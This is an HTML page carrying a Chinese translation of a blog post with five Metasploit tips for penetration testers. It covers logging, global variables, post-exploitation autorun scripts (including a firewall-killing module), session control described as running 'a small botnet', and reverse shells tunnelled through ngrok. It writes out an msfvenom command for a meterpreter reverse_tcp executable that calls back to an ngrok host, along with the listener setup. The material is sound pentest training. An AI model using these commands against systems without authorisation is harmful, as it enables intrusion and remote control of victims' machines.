<html>
<head>
<title>Mastering Metasploit: Five Tips that I Discovered too Late</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">掌握 Metasploit:我发现得太晚的五个技巧</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/mastering-metasploit-five-tips-that-i-discovered-too-late-61c5ecb7c938?source=collection_archive---------2-----------------------#2022-10-12">https://blog.devgenius.io/mastering-metasploit-five-tips-that-i-discovered-too-late-61c5ecb7c938?source=collection_archive---------2-----------------------#2022-10-12</a></blockquote><div><div class="fc ib ic id ie if"/><div class="ig ih ii ij ik"><div class=""/><figure class="gl gn jl jm jn jo gh gi paragraph-image"><div class="gh gi jk"><img src="../Images/5185b3e5ae52d8480487a352df3d1bc5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1224/format:webp/1*zoqrq-elHgdkNurUmHzl6A.jpeg"/></div></figure><h1 id="af31" class="jr js in bd jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko bi translated">0.开始时:</h1><p id="8a6c" class="pw-post-body-paragraph kp kq in kr b ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ig bi translated">从一开始，<a class="ae ln" href="https://www.metasploit.com/" rel="noopener ugc nofollow" target="_blank"> Metasploit </a>就被认为是一个强大的工具，有助于探测跨网络的系统漏洞。该框架提供了一个模块化平台，用于执行漏洞利用、有效负载、辅助功能、编码器、监听器、外壳代码和开发后代码。利用这个包含强大功能的强大工具，我将探索一些我希望在第一次开始使用 Metasploit 框架时就知道的特性。</p><h1 id="5666" class="jr js in bd jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko bi translated">1.打破东西的记录和责任:</h1><p id="3b56" class="pw-post-body-paragraph kp kq in kr b ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ig bi translated">在渗透测试项目期间，必须提供访问证据、潜在影响，以及在负面情况下，目标系统上运行的命令的责任。如果生产中的设备变得无响应并离线，pentester 会记录产生这种情况所运行的命令，如果安全专家能够访问数据，他们会有一个日志文件来展示对组织的影响。这可以利用 Metasploit 的假脱机功能来实现。</p><p id="88ea" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">要捕获在 Metasploit 中运行的模块的输出，请使用 spool 命令并指定一个目标日志文件:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="7072" class="mc js in ly b gy md me l mf mg">msf6&gt; spool /tmp/Company_A_DC.log</span></pre><h1 id="c6c4" class="jr js in bd jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko bi translated">2.设置全局变量以避免混乱:</h1><p id="88bc" class="pw-post-body-paragraph kp kq in kr b ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ig bi translated">为了在 pentest 中节省大量的输入，安全专家可以在 Metasploit 中设置全局变量。这可以通过 setg 命令来完成。一旦设置好这些变量，就可以根据需要在任意数量的漏洞和辅助模块中使用这些变量。也可以保存它们以供下次启动 Metasploit 时使用。然而，缺陷是忘记保存的变量，所以在运行模块之前总是检查选项。相反，unsetg 命令可用于取消设置全局变量。在下面的例子中，变量以全大写形式输入(例如:LHOST)，但是 Metasploit 不区分大小写，所以没有必要这样做。</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="09f7" class="mc js in ly b gy md me l mf mg">msf6 &gt; setg LHOST 192.168.1.101<br/>LHOST =&gt; 192.168.1.101<br/>msf6 &gt; setg RHOSTS 192.168.1.0/24<br/>RHOSTS =&gt; 192.168.1.0/24<br/>msf6 &gt; setg RHOST 192.168.1.136<br/>RHOST =&gt; 192.168.1.136</span></pre><h1 id="af9f" class="jr js in bd jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko bi translated">3.懒惰黑客的回调自动化:</h1><p id="2ff1" class="pw-post-body-paragraph kp kq in kr b ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ig bi translated">在约定期间，等待反向 shell 的回调可能会很乏味。如果 pentester 希望在收到 shell 后自动运行命令和模块，他们可以利用 AutoRunScript 功能来实现。</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="43b6" class="mc js in ly b gy md me l mf mg">msf6 &gt;set AutoRunScript multi_console_command -rc /root/commands.rc</span></pre><p id="7f82" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated"><code class="fe mh mi mj ly b">/root/commands.rc</code>包含您希望运行的命令，例如:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="bd98" class="mc js in ly b gy md me l mf mg">run post/windows/manage/migrate<br/>run post/windows/manage/killfw<br/>run post/windows/gather/checkvm</span></pre><h1 id="cb34" class="jr js in bd jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko bi translated">4.僵尸网络的会话管理:</h1><p id="c21f" class="pw-post-body-paragraph kp kq in kr b ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ig bi translated">在控制多个被入侵的设备时，pentester 可以利用 sessions 命令来列出、执行和操纵连接。这在控制一个小型僵尸网络时，或者如果有人想欺骗一群不知情的同伴时(当然是合法的)，会非常有用。</p><p id="2759" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">列出所有会话:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="7712" class="mc js in ly b gy md me l mf mg">msf6 &gt; sessions -l</span></pre><p id="7a24" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">在所有会话中执行命令:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="c3d7" class="mc js in ly b gy md me l mf mg">msf6 &gt; sessions -C &lt;command&gt;</span></pre><p id="315a" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">终止所有会话:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="45fb" class="mc js in ly b gy md me l mf mg">msf6&gt; sessions -K</span></pre><p id="247a" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">在许多平台上将 shell 升级到 meterpreter 会话:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="a700" class="mc js in ly b gy md me l mf mg">msf6&gt; sessions -u</span></pre><h1 id="b7b3" class="jr js in bd jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko bi translated">5.用 Ngrok 攻击局域网外部:</h1><p id="2acb" class="pw-post-body-paragraph kp kq in kr b ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ig bi translated">Ngrok 是一项免费服务，它将运行在本地机器上的服务器共享到互联网上。虽然没有直接内置到 Metasploit 功能中，但 Ngrok 的功能与 Metasploit 的有效负载相结合，产生了致命的组合。这种“穷人的反向外壳”几乎消除了对端口转发的需求，允许对强化网络的快速入侵和回调。</p><p id="d29e" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">在<a class="ae ln" href="https://dashboard.ngrok.com/get-started/setup" rel="noopener ugc nofollow" target="_blank"> ngrok </a>中设置一个免费账户并启动 ngrok:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="5c87" class="mc js in ly b gy md me l mf mg">./ngrok tcp 9999<br/><br/># Forwarding tcp://0.tcp.ngrok.io:19631 -&gt; localhost:9999</span></pre><p id="f149" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">创建恶意负载:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="6ed2" class="mc js in ly b gy md me l mf mg">msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19631 -f exe &gt; payload.exe</span></pre><p id="4d31" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">启动监听器:</p><pre class="lt lu lv lw gt lx ly lz ma aw mb bi"><span id="23cd" class="mc js in ly b gy md me l mf mg">msf6 &gt; use exploit/multi/handler <br/>msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp <br/>msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 <br/>msf6 exploit(multi/handler) &gt; set LPORT 9999 <br/>msf6 exploit(multi/handler) &gt; exploit</span></pre><figure class="lt lu lv lw gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/d2dec6e52caebbeab611aafb4e197254.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W1WLRhv24OZpRdkT5x-Fxg.jpeg"/></div></div></figure><p id="bc86" class="pw-post-body-paragraph kp kq in kr b ks lo ku kv kw lp ky kz la lq lc ld le lr lg lh li ls lk ll lm ig bi translated">如果你喜欢这篇文章，并学到了一些有用的技巧，请随时关注我的<a class="ae ln" href="https://github.com/RoseSecurity" rel="noopener ugc nofollow" target="_blank"> Github </a>反病毒规避技术库，不断更新的 Red-Teaming 和 pentest TTP，等等！</p></div></div>    
</body>
</html>